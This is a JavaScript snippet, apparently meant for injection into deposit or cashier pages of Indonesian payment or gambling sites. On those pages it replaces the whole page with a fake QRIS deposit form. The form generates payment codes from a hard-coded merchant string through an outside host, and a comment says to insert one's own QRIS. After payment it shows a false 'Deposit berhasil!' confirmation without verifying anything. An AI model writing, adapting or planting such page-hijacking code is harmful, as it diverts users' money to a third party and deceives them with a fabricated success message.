(function () {
  const url = window.location.href;
  const match = [
    '/deposit', '/bank', '/deposit.php', '/qris.php', '/cashier',
    '/metode/?bank=', '/?bank=', '/?page=transaksi',
    '/index.php?page=transaksi', '/?deposit&head=home',
    '/index.php?page=cashier', '/bank.php'
  ];
  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  // GANTI DENGAN QRIS STATIS ANDA
  const QRIS_STATIC = '00020101021126610014COM.GO-JEK.WWW01189360091433048003880210G3048003880303UMI51440014ID.CO.QRIS.WWW0215ID10254527981800303UMI5204792953033605802ID5918Asiatimur%2C%20Hiburan6008MERANGIN61053735462070703A0163046BFC';

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Deposit QRIS</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
      * { margin:0; padding:0; box-sizing:border-box; }
      body {
        font-family: 'Poppins', sans-serif;
        background: #0f172a;
        color: #f8fafc;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 16px;
      }
      .container {
        max-width: 480px;
        width: 100%;
        background: #1e293b;
        border-radius: 20px;
        padding: 20px;
        box-shadow: 0 8px 30px rgba(0,0,0,0.5);
        border: 1px solid rgba(59,130,246,0.3);
      }
      .header {
        text-align: center;
        margin-bottom: 16px;
      }
      .header h1 {
        font-size: 20px;
        font-weight: 700;
        color: #60a5fa;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      .header p {
        font-size: 13px;
        color: #94a3b8;
        margin-top: 4px;
      }
      .alert {
        background: rgba(245,158,11,0.12);
        border-left: 3px solid #f59e0b;
        padding: 8px 12px;
        border-radius: 6px;
        font-size: 12px;
        color: #fde68a;
        display: flex;
        align-items: center;
        gap: 8px;
        margin-bottom: 16px;
      }
      .form-group {
        margin-bottom: 12px;
      }
      .form-group label {
        display: block;
        font-size: 13px;
        font-weight: 600;
        color: #60a5fa;
        margin-bottom: 6px;
      }
      .input-row {
        display: flex;
        gap: 8px;
        align-items: center;
      }
      .input-row input {
        flex: 1;
        padding: 12px 14px;
        background: #0f172a;
        border: 1px solid #334155;
        border-radius: 10px;
        font-size: 16px;
        color: #fff;
        outline: none;
        transition: 0.2s;
      }
      .input-row input:focus {
        border-color: #3b82f6;
        box-shadow: 0 0 0 2px rgba(59,130,246,0.3);
      }
      .quick-amounts {
        display: flex;
        gap: 8px;
        margin: 12px 0 16px;
        flex-wrap: wrap;
      }
      .quick-amounts button {
        flex: 1;
        min-width: 60px;
        padding: 8px 0;
        background: #0f172a;
        border: 1px solid #334155;
        border-radius: 8px;
        color: #94a3b8;
        font-weight: 600;
        font-size: 13px;
        cursor: pointer;
        transition: 0.2s;
      }
      .quick-amounts button:active { transform: scale(0.95); background: #1e293b; }
      .qr-wrapper {
        margin-top: 12px;
        border-radius: 16px;
        overflow: hidden;
        background: #000;
        display: none;
        border: 2px solid #3b82f6;
        box-shadow: 0 0 20px rgba(59,130,246,0.2);
      }
      .qr-wrapper.active { display: block; }
      .qr-wrapper iframe {
        width: 100%;
        height: 520px;
        border: none;
        display: block;
      }
      .qr-actions {
        display: none; /* default hidden */
        gap: 10px;
        margin-top: 12px;
      }
      .qr-actions.show { display: flex; }
      .qr-actions button {
        flex: 1;
        padding: 14px;
        border-radius: 12px;
        font-weight: 700;
        font-size: 15px;
        border: none;
        cursor: pointer;
        transition: 0.2s;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      .qr-actions button:active { transform: scale(0.96); }
      .btn-done {
        background: #10b981;
        color: #fff;
      }
      .btn-primary {
        width: 100%;
        padding: 16px;
        background: #3b82f6;
        border: none;
        border-radius: 12px;
        font-weight: 700;
        font-size: 16px;
        color: #fff;
        cursor: pointer;
        transition: 0.2s;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        margin-top: 8px;
      }
      .btn-primary:active { transform: scale(0.97); }
      .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
      .btn-help {
        width: 100%;
        padding: 12px;
        background: #334155;
        border: none;
        border-radius: 12px;
        font-weight: 600;
        color: #94a3b8;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        transition: 0.2s;
        margin-top: 12px;
      }
      .btn-help:active { background: #475569; }
      .toast {
        position: fixed;
        bottom: 24px;
        left: 16px;
        right: 16px;
        max-width: 400px;
        margin: 0 auto;
        padding: 14px 20px;
        background: #1e293b;
        border: 1px solid #334155;
        border-radius: 12px;
        color: #f8fafc;
        font-weight: 500;
        text-align: center;
        transform: translateY(100px);
        opacity: 0;
        transition: 0.3s ease;
        pointer-events: none;
        z-index: 999;
        box-shadow: 0 8px 30px rgba(0,0,0,0.6);
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
      }
      .toast.show {
        transform: translateY(0);
        opacity: 1;
      }
      .toast.success { border-left: 4px solid #10b981; }
      .toast.error { border-left: 4px solid #ef4444; }
      .toast.info { border-left: 4px solid #3b82f6; }
      .footer {
        text-align: center;
        margin-top: 16px;
        font-size: 11px;
        color: #475569;
      }
      @media (max-width: 480px) {
        body { padding: 10px; }
        .container { padding: 16px; }
        .qr-wrapper iframe { height: 440px; }
      }
    </style>
  `;

  document.body.innerHTML = `
    <div class="container">
      <div class="header">
        <h1><i class="fas fa-qrcode"></i> QRIS Deposit</h1>
        <p>Scan untuk bayar</p>
      </div>
      <div class="alert">
        <i class="fas fa-info-circle"></i> Minimal Rp 50.000
      </div>
      <div class="form-group">
        <label for="nominal">Nominal</label>
        <input type="number" id="nominal" placeholder="Contoh: 100000" min="50000" inputmode="numeric" style="width:100%; padding:12px; background:#0f172a; border:1px solid #334155; border-radius:10px; font-size:16px; color:#fff; outline:none;">
      </div>
      <div class="quick-amounts">
        <button onclick="setAmount(50000)">50K</button>
        <button onclick="setAmount(100000)">100K</button>
        <button onclick="setAmount(200000)">200K</button>
        <button onclick="setAmount(500000)">500K</button>
      </div>
      <!-- Tombol Kirim / Bayar di bawah quick amounts -->
      <button id="generateBtn" class="btn-primary" onclick="generateQRIS()">
        <i class="fas fa-paper-plane"></i> Kirim / Bayar
      </button>
      <div id="qrWrapper" class="qr-wrapper">
        <iframe id="qrisIframe" allow="camera; clipboard-read; clipboard-write"></iframe>
      </div>
      <div id="qrActions" class="qr-actions">
        <button class="btn-done" onclick="confirmPayment()"><i class="fas fa-check-circle"></i> Sudah Bayar</button>
      </div>
      <button class="btn-help" onclick="openHelp()"><i class="fas fa-headset"></i> Bantuan</button>
      <div class="footer">© 2026 • QRIS Dinamis</div>
    </div>
    <div id="toast" class="toast"></div>
  `;

  // Toast
  function showToast(msg, type = 'info') {
    const t = document.getElementById('toast');
    t.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${msg}`;
    t.className = `toast ${type}`;
    t.offsetHeight;
    t.classList.add('show');
    clearTimeout(t._timer);
    t._timer = setTimeout(() => t.classList.remove('show'), 2500);
  }

  // Set amount
  window.setAmount = function(val) {
    document.getElementById('nominal').value = val;
    document.getElementById('nominal').style.borderColor = '#3b82f6';
  };

  // Generate QRIS
  window.generateQRIS = function() {
    const nominal = Number(document.getElementById('nominal').value || 0);
    if (nominal < 50000) {
      showToast('Minimal Rp 50.000', 'error');
      return;
    }
    const btn = document.getElementById('generateBtn');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
    const iframe = document.getElementById('qrisIframe');
    const url = `https://qrismeme.vercel.app/deposit?qris=${encodeURIComponent(QRIS_STATIC)}&amount=${nominal}&embed=1`;
    iframe.src = url;
    const wrapper = document.getElementById('qrWrapper');
    wrapper.classList.add('active');
    document.getElementById('qrActions').classList.add('show');
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-paper-plane"></i> Kirim / Bayar';
    showToast(`QRIS Rp ${nominal.toLocaleString('id-ID')} siap`, 'success');
    // scroll ke iframe
    setTimeout(() => wrapper.scrollIntoView({ behavior: 'smooth', block: 'center' }), 200);
  };

  // Confirm payment
  window.confirmPayment = function() {
    showToast('Pembayaran dikonfirmasi, menunggu proses...', 'info');
    setTimeout(() => {
      showToast('Deposit berhasil!', 'success');
      setTimeout(() => history.back(), 1200);
    }, 1500);
  };

  // Help
  window.openHelp = function() {
    showToast('Buka live chat', 'info');
    setTimeout(() => window.open('https://direct.lc.chat/19347249', '_blank'), 300);
  };

  // Enter key trigger generate
  document.getElementById('nominal').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      generateQRIS();
    }
  });

  // Input validation
  document.getElementById('nominal').addEventListener('input', function() {
    const v = Number(this.value || 0);
    this.style.borderColor = v >= 50000 ? '#3b82f6' : (v > 0 ? '#ef4444' : '#334155');
  });

  // Initial toast
  setTimeout(() => showToast('Masukkan nominal lalu Kirim / Bayar', 'info'), 600);
})();
